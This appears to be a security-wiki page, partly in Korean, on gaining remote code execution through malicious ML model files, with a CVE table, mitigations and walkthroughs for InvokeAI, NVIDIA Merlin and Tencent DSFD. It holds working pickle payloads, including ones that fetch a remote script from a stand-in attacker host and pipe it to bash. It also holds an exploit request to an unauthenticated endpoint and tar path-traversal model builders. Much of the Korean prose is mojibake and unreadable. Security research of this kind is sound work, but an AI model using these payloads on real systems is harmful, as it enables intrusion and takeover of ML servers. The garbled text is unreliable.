# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning ëª¨ë¸ì€ ë³´í†µ ONNX, TensorFlow, PyTorch ë“± ë‹¤ì–‘í•œ í¬ë§·ìœ¼ë¡œ ê³µìœ ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ëª¨ë¸ë“¤ì€ ê°œë°œì ë¨¸ì‹ ì´ë‚˜ í”„ë¡œë•ì…˜ ì‹œìŠ¤í…œì— ë¡œë“œë˜ì–´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ëª¨ë¸ì— ì•…ì„± ì½”ë“œë¥¼ í¬í•¨í•˜ì§€ ì•Šì•„ì•¼ í•˜ì§€ë§Œ, ëª¨ë¸ì´ ì˜ë„ëœ ê¸°ëŠ¥ìœ¼ë¡œì„œ ë˜ëŠ” ëª¨ë¸ ë¡œë”© ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì·¨ì•½ì  ë•Œë¬¸ì— ì‹œìŠ¤í…œì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | ì•…ì„± pickleì´ ëª¨ë¸ ì²´í¬í¬ì¸íŠ¸ì— í¬í•¨ë˜ì–´ ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ (`weights_only` ë³´í˜¸ ìš°íšŒ)                                                  | |
| PyTorch **TorchServe**      | *ShellTorch* â€“ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + ì•…ì„± ëª¨ë¸ ë‹¤ìš´ë¡œë“œë¡œ ì½”ë“œ ì‹¤í–‰ ìœ ë°œ; management APIì˜ Java deserialization RCE                                                   | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì²´í¬í¬ì¸íŠ¸ê°€ `load_model_trainer_states_from_checkpoint` ë™ì•ˆ pickle reducerë¥¼ íŠ¸ë¦¬ê±° â†’ ML ì›Œì»¤ì—ì„œ ì½”ë“œ ì‹¤í–‰              | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLì—ì„œ ëª¨ë¸ì„ ë¡œë“œí•  ë•Œ `yaml.unsafe_load` ì‚¬ìš© (ì½”ë“œ ì‹¤í–‰) <br> Lambda ë ˆì´ì–´ê°€ í¬í•¨ëœ ëª¨ë¸ ë¡œë“œ ì‹œ ì„ì˜ì˜ Python ì½”ë“œ ì‹¤í–‰            | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | ì¡°ì‘ëœ `.tflite` ëª¨ë¸ì´ ì •ìˆ˜ ì˜¤ë²„í”Œë¡œë¥¼ ìœ ë°œ â†’ í™ ì†ìƒ (ì ì¬ì  RCE)                                                                    | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`ë¡œ ëª¨ë¸ì„ ë¡œë“œí•˜ë©´ ê³µê²©ìì˜ `__reduce__` í˜ì´ë¡œë“œê°€ í¬í•¨ëœ pickleì´ ì‹¤í–‰ë¨                                                 | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`ì˜ ê¸°ë³¸ê°’ì´ í”¼í´ëœ ê°ì²´ ë°°ì—´ì„ í—ˆìš© â€“ ì•…ì„± `.npy/.npz`ê°€ ì½”ë“œ ì‹¤í–‰ì„ ìœ ë°œ                                                   | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX ëª¨ë¸ì˜ external-weights ê²½ë¡œê°€ ë””ë ‰í† ë¦¬ë¥¼ ë²—ì–´ë‚  ìˆ˜ ìˆìŒ (ì„ì˜ íŒŒì¼ ì½ê¸°) <br> ì•…ì„± ONNX ëª¨ë¸ tarê°€ ì„ì˜ íŒŒì¼ì„ ë®ì–´ì“°ê²Œ í•˜ì—¬ RCEë¡œ ì´ì–´ì§ | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operatorê°€ ê³µê²©ìì˜ ë„¤ì´í‹°ë¸Œ ì½”ë“œë¥¼ ìš”êµ¬í•  ìˆ˜ ìˆìŒ; ë³µì¡í•œ ëª¨ë¸ ê·¸ë˜í”„ê°€ ë¡œì§ì„ ì•…ìš©í•˜ì—¬ ì˜ë„í•˜ì§€ ì•Šì€ ì—°ì‚°ì„ ì‹¤í–‰í•˜ë„ë¡ í•¨      | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ ëª¨ë¸ ë¡œë“œ APIë¥¼ ì‚¬ìš©í•˜ë©´ ìƒëŒ€ ê²½ë¡œ íŠ¸ë˜ë²„ì„¤ë¡œ íŒŒì¼ì„ ì“°ê²Œ ë˜ì–´ (ì˜ˆ: `.bashrc` ë®ì–´ì“°ê¸°) RCE ê°€ëŠ¥ì„± | |
| **GGML (GGUF format)**      | **CVE-2024-25664 â€¦ 25668** (multiple heap overflows)                                                                         | ì†ìƒëœ GGUF ëª¨ë¸ íŒŒì¼ì´ íŒŒì„œì—ì„œ í™ ë²„í¼ ì˜¤ë²„í”Œë¡œë¥¼ ìœ ë°œí•˜ì—¬ í”¼í•´ì ì‹œìŠ¤í…œì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•¨                              | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda ë ˆì´ì–´ê°€ í¬í•¨ëœ ì•…ì„± HDF5 (`.h5`) ëª¨ë¸ì€ ì—¬ì „íˆ ë¡œë“œ ì‹œ ì½”ë“œê°€ ì‹¤í–‰ë¨ (Keras safe_modeê°€ ì˜¤ë˜ëœ í¬ë§·ì„ ì»¤ë²„í•˜ì§€ ì•ŠìŒ â€“ â€œdowngrade attackâ€) | |
| **Others** (general)        | *Design flaw* â€“ Pickle serialization                                                                                         | ë§ì€ ML ë„êµ¬ë“¤(ì˜ˆ: pickle ê¸°ë°˜ ëª¨ë¸ í¬ë§·, Python `pickle.load`)ì€ ì™„í™”ë˜ì§€ ì•Šìœ¼ë©´ ëª¨ë¸ íŒŒì¼ì— í¬í•¨ëœ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•¨                   | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### ğŸ†•  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`ëŠ” Stable-Diffusionìš©ìœ¼ë¡œ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ì›¹ ì¸í„°í˜ì´ìŠ¤ì…ë‹ˆë‹¤. Versions **5.3.1 â€“ 5.4.2**ëŠ” ì‚¬ìš©ìê°€ ì„ì˜ì˜ URLì—ì„œ ëª¨ë¸ì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ë¡œë“œí•  ìˆ˜ ìˆê²Œ í•˜ëŠ” REST ì—”ë“œí¬ì¸íŠ¸ `/api/v2/models/install`ì„ ë…¸ì¶œí•©ë‹ˆë‹¤.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  ì œê³µëœ ì½˜í…ì¸ ê°€ ì‚¬ìš©ì ì œì–´ URLì—ì„œ ì§ì ‘ ì˜¤ê¸° ë•Œë¬¸ì—, ê³µê²©ìëŠ” ì²´í¬í¬ì¸íŠ¸ ì•ˆì— ì‚¬ìš©ì ì •ì˜ `__reduce__` ë©”ì„œë“œë¥¼ ê°€ì§„ ì•…ì˜ì  ê°ì²´ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤; í•´ë‹¹ ë©”ì„œë“œëŠ” **during deserialization** ë™ì•ˆ ì‹¤í–‰ë˜ì–´ InvokeAI ì„œë²„ì—ì„œ **remote code execution (RCE)**ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. ì•…ì„± checkpoint ìƒì„±:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. ì œì–´í•˜ëŠ” HTTP ì„œë²„ì— `payload.ckpt`ì„ í˜¸ìŠ¤íŒ…í•˜ì„¸ìš” (ì˜ˆ: `http://ATTACKER/payload.ckpt`).
3. ì·¨ì•½í•œ endpointë¥¼ íŠ¸ë¦¬ê±°í•˜ì„¸ìš” (ì¸ì¦ ë¶ˆí•„ìš”):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false â†’ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAIê°€ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë©´ `torch.load()`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤ â†’ `os.system` gadgetê°€ ì‹¤í–‰ë˜ì–´ ê³µê²©ìëŠ” InvokeAI í”„ë¡œì„¸ìŠ¤ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì½”ë“œ ì‹¤í–‰ì„ íšë“í•©ë‹ˆë‹¤.

Ready-made exploit: **Metasploit** ëª¨ë“ˆ `exploit/linux/http/invokeai_rce_cve_2024_12029`ì´ ì „ì²´ íë¦„ì„ ìë™í™”í•©ë‹ˆë‹¤.

#### Conditions

â€¢  InvokeAI 5.3.1-5.4.2 (scan í”Œë˜ê·¸ ê¸°ë³¸ê°’ **false**)  
â€¢  ê³µê²©ìê°€ `/api/v2/models/install`ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŒ  
â€¢  í”„ë¡œì„¸ìŠ¤ê°€ ì…¸ ëª…ë ¹ì„ ì‹¤í–‰í•  ê¶Œí•œì„ ê°€ì§

#### Mitigations

* **InvokeAI â‰¥ 5.4.3**ë¡œ ì—…ê·¸ë ˆì´ë“œ â€“ í•´ë‹¹ íŒ¨ì¹˜ì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ `scan=True`ë¡œ ì„¤ì •í•˜ê³  ì—­ì§ë ¬í™” ì „ì— ë§¬ì›¨ì–´ ìŠ¤ìºë‹ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.  
* ì²´í¬í¬ì¸íŠ¸ë¥¼ í”„ë¡œê·¸ë˜ë° ë°©ì‹ìœ¼ë¡œ ë¡œë“œí•  ë•Œ `torch.load(file, weights_only=True)` ë˜ëŠ” ìƒˆë¡œìš´ [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) í—¬í¼ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.  
* ëª¨ë¸ ì†ŒìŠ¤ì— ëŒ€í•´ í—ˆìš© ëª©ë¡(allow-lists) / ì„œëª…ì„ ì ìš©í•˜ê³  ì„œë¹„ìŠ¤ë¥¼ ìµœì†Œ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ì„¸ìš”.

> âš ï¸ ê¸°ì–µí•˜ì„¸ìš” **ì–´ë–¤** Python pickle ê¸°ë°˜ í˜•ì‹(ë§ì€ `.pt`, `.pkl`, `.ckpt`, `.pth` íŒŒì¼ í¬í•¨)ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì†ŒìŠ¤ì—ì„œ ì—­ì§ë ¬í™”í•˜ëŠ” ê²ƒì´ ë³¸ì§ˆì ìœ¼ë¡œ ì•ˆì „í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

---

êµ¬ë²„ì „ InvokeAIë¥¼ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ë’¤ì—ì„œ ê³„ì† ì‹¤í–‰í•´ì•¼ í•˜ëŠ” ê²½ìš°ì˜ ì„ì‹œ ì™„í™” ì˜ˆ:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### ğŸ†• NVIDIA Merlin Transformers4Rec RCE â€” ì•ˆì „í•˜ì§€ ì•Šì€ `torch.load`ë¥¼ í†µí•œ ì·¨ì•½ì  (CVE-2025-23298)

NVIDIAì˜ Transformers4Rec(Merlinì˜ ì¼ë¶€)ëŠ” ì‚¬ìš©ì ì œê³µ ê²½ë¡œì— ëŒ€í•´ ì§ì ‘ `torch.load()`ë¥¼ í˜¸ì¶œí•˜ëŠ” ì•ˆì „í•˜ì§€ ì•Šì€ ì²´í¬í¬ì¸íŠ¸ ë¡œë”ë¥¼ ë…¸ì¶œí–ˆìŠµë‹ˆë‹¤. `torch.load`ê°€ Python `pickle`ì— ì˜ì¡´í•˜ê¸° ë•Œë¬¸ì—, ê³µê²©ìê°€ ì¡°ì‘í•œ ì²´í¬í¬ì¸íŠ¸ëŠ” ì—­ì§ë ¬í™” ì¤‘ reducerë¥¼ í†µí•´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½ ê²½ë¡œ(íŒ¨ì¹˜ ì „): `transformers4rec/torch/trainer/trainer.py` â†’ `load_model_trainer_states_from_checkpoint(...)` â†’ `torch.load(...)`.

ì´ê²ƒì´ RCEë¡œ ì´ì–´ì§€ëŠ” ì´ìœ : Pythonì˜ pickleì—ì„œëŠ” ê°ì²´ê°€ reducer (`__reduce__`/`__setstate__`)ë¥¼ ì •ì˜í•˜ì—¬ í˜¸ì¶œ ê°€ëŠ¥í•œ ê°ì²´ì™€ ì¸ìë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—­ì§ë ¬í™” ê³¼ì •ì—ì„œ ê·¸ í˜¸ì¶œ ê°€ëŠ¥í•œ ê°ì²´ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ëŸ° ê°ì²´ê°€ ì²´í¬í¬ì¸íŠ¸ì— í¬í•¨ë˜ì–´ ìˆìœ¼ë©´, ê°€ì¤‘ì¹˜ê°€ ì‚¬ìš©ë˜ê¸° ì „ì— ì‹¤í–‰ë©ë‹ˆë‹¤.

ìµœì†Œ ì•…ì„± ì²´í¬í¬ì¸íŠ¸ ì˜ˆ:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example â€“ crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- ëª¨ë¸ ë¡œë“œ:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# âš ï¸ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencentì˜ FaceDetection-DSFDëŠ” ì‚¬ìš©ì ì œì–´ ë°ì´í„°ë¥¼ deserializesí•˜ëŠ” `resnet` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ZDIëŠ” remote attackerê°€ í”¼í•´ìë¥¼ ê°•ì œë¡œ ì•…ì„± í˜ì´ì§€/íŒŒì¼ì„ ë¡œë“œí•˜ê²Œ í•œ ë’¤, ê·¸ í˜ì´ì§€ê°€ ì¡°ì‘ëœ serialized blobì„ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ë¡œ ì „ì†¡í•˜ê²Œ í•˜ê³  `root`ë¡œì„œ deserializationì„ íŠ¸ë¦¬ê±°í•˜ì—¬ ì™„ì „í•œ ì¹¨í•´(full compromise)ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## ëª¨ë¸ì„ í†µí•œ Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ë©´ ëª¨ë¸ì´ ë¡œë“œë  ë•Œ `/tmp` ë””ë ‰í„°ë¦¬ì— íŒŒì¼ì„ ìƒì„±í•˜ëŠ” ëª¨ë¸ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
ë˜ëŠ” ë‹¤ìŒ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ë©´ ëª¨ë¸ì´ ë¡œë“œë  ë•Œ `/tmp` ë””ë ‰í„°ë¦¬ì— ëŒ€í•œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ìƒì„±í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### ì‹¬ì¸µ ë¶„ì„: Keras .keras deserialization and gadget hunting

ë‹¤ìŒ ì£¼ì œ(.keras internals, Lambda-layer RCE, the arbitrary import issue in â‰¤ 3.8, post-fix gadget discovery inside the allowlist)ì— ê´€í•œ ì§‘ì¤‘ ê°€ì´ë“œëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## ì°¸ê³ ìë£Œ

- [OffSec blog â€“ "CVE-2024-12029 â€“ InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch â€“ security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog â€“ CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
